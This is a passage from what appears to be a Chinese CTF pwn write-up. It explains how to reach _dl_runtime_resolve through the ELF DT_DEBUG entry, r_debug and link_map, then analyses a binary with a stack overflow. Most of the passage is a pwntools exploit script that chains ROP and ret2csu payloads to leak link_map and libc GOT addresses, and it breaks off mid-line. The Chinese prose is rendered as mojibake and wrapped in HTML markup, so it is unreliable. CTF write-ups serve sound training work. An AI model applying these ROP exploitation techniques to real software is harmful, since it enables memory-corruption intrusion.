class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000600E10 0C 00 00 00 00 00 00 00 B0 04+Elf64_Dyn &lt;0Ch, 4004B0h&gt;                ; DT_INIT</span><br><span class="line">LOAD:0000000000600E20 0D 00 00 00 00 00 00 00 F4 07+Elf64_Dyn &lt;0Dh, 4007F4h&gt;                ; DT_FINI</span><br><span class="line">LOAD:0000000000600E30 19 00 00 00 00 00 00 00 E8 0D+Elf64_Dyn &lt;19h, 600DE8h&gt;                ; DT_INIT_ARRAY</span><br><span class="line">LOAD:0000000000600E40 1B 00 00 00 00 00 00 00 08 00+Elf64_Dyn &lt;1Bh, 8&gt;                      ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:0000000000600E50 1A 00 00 00 00 00 00 00 F0 0D+Elf64_Dyn &lt;1Ah, 600DF0h&gt;                ; DT_FINI_ARRAY</span><br><span class="line">LOAD:0000000000600E60 1C 00 00 00 00 00 00 00 08 00+Elf64_Dyn &lt;1Ch, 8&gt;                      ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:0000000000600E70 F5 FE FF 6F 00 00 00 00 98 02+Elf64_Dyn &lt;6FFFFEF5h, 400298h&gt;          ; DT_GNU_HASH</span><br><span class="line">LOAD:0000000000600E80 05 00 00 00 00 00 00 00 78 03+Elf64_Dyn &lt;5, 400378h&gt;                  ; DT_STRTAB</span><br><span class="line">LOAD:0000000000600E90 06 00 00 00 00 00 00 00 D0 02+Elf64_Dyn &lt;6, 4002D0h&gt;                  ; DT_SYMTAB</span><br><span class="line">LOAD:0000000000600EA0 0A 00 00 00 00 00 00 00 64 00+Elf64_Dyn &lt;0Ah, 64h&gt;                    ; DT_STRSZ</span><br><span class="line">LOAD:0000000000600EB0 0B 00 00 00 00 00 00 00 18 00+Elf64_Dyn &lt;0Bh, 18h&gt;                    ; DT_SYMENT</span><br><span class="line">LOAD:0000000000600EC0 15 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;15h, 0&gt;                      ; DT_DEBUG</span><br><span class="line">LOAD:0000000000600ED0 03 00 00 00 00 00 00 00 C0 0F+Elf64_Dyn &lt;3, 600FC0h&gt;                  ; DT_PLTGOT</span><br><span class="line">LOAD:0000000000600EE0 07 00 00 00 00 00 00 00 20 04+Elf64_Dyn &lt;7, 400420h&gt;                  ; DT_RELA</span><br><span class="line">LOAD:0000000000600EF0 08 00 00 00 00 00 00 00 90 00+Elf64_Dyn &lt;8, 90h&gt;                      ; DT_RELASZ</span><br><span class="line">LOAD:0000000000600F00 09 00 00 00 00 00 00 00 18 00+Elf64_Dyn &lt;9, 18h&gt;                      ; DT_RELAENT</span><br><span class="line">LOAD:0000000000600F10 18 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;18h, 0&gt;                      ; DT_BIND_NOW</span><br><span class="line">LOAD:0000000000600F20 FB FF FF 6F 00 00 00 00 01 00+Elf64_Dyn &lt;6FFFFFFBh, 1&gt;                ; DT_FLAGS_1</span><br><span class="line">LOAD:0000000000600F30 FE FF FF 6F 00 00 00 00 F0 03+Elf64_Dyn &lt;6FFFFFFEh, 4003F0h&gt;          ; DT_VERNEED</span><br><span class="line">LOAD:0000000000600F40 FF FF FF 6F 00 00 00 00 01 00+Elf64_Dyn &lt;6FFFFFFFh, 1&gt;                ; DT_VERNEEDNUM</span><br><span class="line">LOAD:0000000000600F50 F0 FF FF 6F 00 00 00 00 DC 03+Elf64_Dyn &lt;6FFFFFF0h, 4003DCh&gt;          ; DT_VERSYM</span><br><span class="line">LOAD:0000000000600F60 00 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;0&gt;                           ; DT_NULL</span><br></pre></td></tr></table></figure><p>åœ¨å…¥å£å¤„å­˜åœ¨ä¸€ä¸ª<code>.dynmic</code>å«åš<code>DT_DEBUG</code>ï¼Œç”±è°ƒè¯•å™¨ä½¿ç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxwordd_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>d_ptr</code>ä½ç½®åªæƒ³çš„æ˜¯<code>r_debug</code>ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* Version number for this protocol.  It should be greater than 0.  */</span></span><br><span class="line">    <span class="keyword">int</span> r_version;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">r_map</span>;</span><span class="comment">/* Head of the chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is the address of a function internal to the run-time linker,</span></span><br><span class="line"><span class="comment">       that will always be called when the linker begins to map in a</span></span><br><span class="line"><span class="comment">       library or unmap it, and again when the mapping change is complete.</span></span><br><span class="line"><span class="comment">       The debugger can set a breakpoint at this address if it wants to</span></span><br><span class="line"><span class="comment">       notice shared object mapping changes.  */</span></span><br><span class="line">    ElfW(Addr) r_brk;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="comment">/* This state value describes the mapping change taking place when</span></span><br><span class="line"><span class="comment">   the `r_brk&#x27; address is called.  */</span></span><br><span class="line">RT_CONSISTENT,<span class="comment">/* Mapping change is complete.  */</span></span><br><span class="line">RT_ADD,<span class="comment">/* Beginning to add a new object.  */</span></span><br><span class="line">RT_DELETE<span class="comment">/* Beginning to remove an object mapping.  */</span></span><br><span class="line">      &#125; r_state;</span><br><span class="line"></span><br><span class="line">    ElfW(Addr) r_ldbase;<span class="comment">/* Base address the linker is loaded at.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸­é—´çš„<code>r_map</code>å°±æ˜¯æŒ‡å‘<code>link_map</code>çš„åœ°å€äº†ã€‚</p><h3 id="è·å¾—-dl-runtime-resolve"><a href="#è·å¾—-dl-runtime-resolve" class="headerlink" title="è·å¾—_dl_runtime_resolve"></a>è·å¾—_dl_runtime_resolve</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥<code>link_map</code>å…¶å®æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨çš„å½¢å¼ï¼Œè€Œä¸”å…¶ä¸­å­˜åœ¨ä¸€ä¸ªç›¸å½“æœ‰ç”¨çš„æˆå‘˜<code>l_info</code>ã€‚è€Œå…¶ä¸­çš„<code>DT_PLTGOT</code>çš„<code>d_tag</code>å­˜æ”¾çš„æ˜¯gotè¡¨çš„åœ°å€ï¼Œé‚£ä¹ˆå¯ä»¥ç»è¿‡å¤šæ¬¡çš„<code>l_next</code>çš„æŸ¥æ‰¾å¾—åˆ°libcçš„gotè¡¨åœ°å€è¿›è€Œè·å¾—<code>_dl_runtime_resolve</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x *((struct link_map*)0x7fd64bb592e0)-&gt;l_next-&gt;l_next-&gt;l_info[3]</span><br><span class="line"><span class="variable">$13</span> = &#123;</span><br><span class="line">  d_tag = 0x3,</span><br><span class="line">  d_un = &#123;</span><br><span class="line">    d_val = 0x7fd64bb05000,</span><br><span class="line">    d_ptr = 0x7fd64bb05000</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; telescope 0x7fd64bb05000</span><br><span class="line">00:0000â”‚  0x7fd64bb05000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x218bc0</span><br><span class="line">01:0008â”‚  0x7fd64bb05008 (_GLOBAL_OFFSET_TABLE_+8) â€”â–¸ 0x7fd64bb1c160 â€”â–¸ 0x7fd64b8ec000 â—‚â€” 0x3010102464c457f</span><br><span class="line">02:0010â”‚  0x7fd64bb05010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0x7fd64bb33c60 (_dl_runtime_resolve_xsave) â—‚â€” endbr64</span><br><span class="line">03:0018â”‚  0x7fd64bb05018 (*ABS*@got.plt) â€”â–¸ 0x7fd64ba89b20 (__strnlen_avx2) â—‚â€” endbr64</span><br><span class="line">04:0020â”‚  0x7fd64bb05020 (*ABS*@got.plt) â€”â–¸ 0x7fd64ba85750 (__rawmemchr_avx2) â—‚â€” endbr64</span><br><span class="line">05:0028â”‚  0x7fd64bb05028 (realloc@got.plt) â€”â–¸ 0x7fd64b914030 â—‚â€” endbr64</span><br><span class="line">06:0030â”‚  0x7fd64bb05030 (*ABS*@got.plt) â€”â–¸ 0x7fd64ba87970 (__strncasecmp_avx) â—‚â€” endbr64</span><br><span class="line">07:0038â”‚  0x7fd64bb05038 (_dl_exception_create@got.plt) â€”â–¸ 0x7fd64b914050 â—‚â€” endbr64</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>_dl_runtime_resolve_xsave</code>å‡½æ•°å°±åœ¨åç§»ä¸º<code>0x10</code>çš„ä½ç½®äº†ã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_40071B();</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®çš„ä»£ç å¾ˆç®€å•ï¼Œ<code>main</code>å‡½æ•°å°±åªæœ‰è¿™å‡ è¡Œä»£ç ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•è¾“å‡ºå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400606</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = *(_QWORD *)(qword_601040 + (<span class="keyword">int</span>)a1);</span><br><span class="line">  qword_601040 = v4;</span><br><span class="line">  result = a1;</span><br><span class="line">  dword_601048 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601028[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601020[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ®µå‡½æ•°åˆ™æ˜¯åˆšå¥½æ»¡è¶³ç¬¬äºŒä¸ªå‡½æ•°ï¼Œèƒ½å¤Ÿå®ç°ä»»æ„åœ°å€è¯»å–ä¹‹åå†™å…¥åˆ°ä»»æ„åœ°å€ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>å› ä¸ºå‰é¢å·²ç»æåˆ°äº†åˆ©ç”¨åŸç†ï¼Œè¿™é‡Œå°±ä¸å¤šèµ˜è¿°ç›´æ¥ä¸Šexpå§ã€‚</p><p>å› ä¸ºæˆ‘çš„expæ˜¯è¾¹æ‰“è¾¹å†™çš„ï¼Œæ‰€ä»¥å†™å¾—åƒä¸€å¨shitæ‰€ä»¥æˆ‘åœ¨æ¯ä¸€æ­¥éƒ½åŠ äº†æ³¨é‡Šæ–¹ä¾¿ç†è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004007e3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004007e1</span></span><br><span class="line">bss = <span class="number">0x601040</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400740</span></span><br><span class="line"></span><br><span class="line">gadget_for_read = <span class="number">0x400606</span></span><br><span class="line">gadget_for_write = <span class="number">0x40067C</span></span><br><span class="line">gadget_csu = <span class="number">0x4007DA</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€ æˆreadä¸€æ¬¡ä¹‹åè¿”å›åˆ°main</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨å›ºå®šä½ç½®å†™ä¸Šç»è¿‡csuä¹‹åéœ€è¦è·³è½¬çš„å‡½æ•°ä½ç½®</span></span><br><span class="line">r.sendline(flat(bss + <span class="number">0x10</span>, gadget_for_read, <span class="number">0xBEEFDEAD</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡csuè°ƒç”¨åˆ°gadget_for_readï¼Œç›®çš„æ˜¯å°†BEEDDEADè¯»å–åˆ°0x601030</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>, <span class="number">1</span>,</span><br><span class="line">               <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€æ ·çš„ä¸ºåç»­åšå‡†å¤‡ï¼Œè¿™é‡Œå°†0x601050å’Œ0x601040çš„æŒ‡è®¾ç½®ä¸º(0x600EC0 + 0x8)ä¹Ÿå°±æ˜¯DT_DEBUG</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x600EC0</span> + <span class="number">0x8</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œå°±æ˜¯è¯»å–DT_DEBUGä¸­çš„d_ptrçš„å€¼ï¼Œå¹¶å†™åˆ°0x601040çš„ä½ç½®</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®a1ä¸º8ï¼Œè¯»å–r_debugä¸­çš„d_valå€¼(å³ä¸ºlink_map)å¹¶å­˜æ”¾åœ¨0x601040ä½ç½®</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®a1ä½-0x54680 + 8ï¼Œè·å¾—link_map-&gt;l_next-&gt;l_next-&gt;l_info[3]çš„å€¼(å³ä¸ºlibcçš„gotè¡¨åœ°å€)å¹¶å­˜æ”¾åœ¨0x601040çš„ä½ç½®</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, -<span class="number">0x54680</span> + <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®a1ä¸º0x10ï¼Œè·å¾—_dl_runtime_resolveå‡½æ•°åœ°å€ï¼Œå¹¶å­˜æ”¾åœ¨0x601fd0ä½ç½®</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span 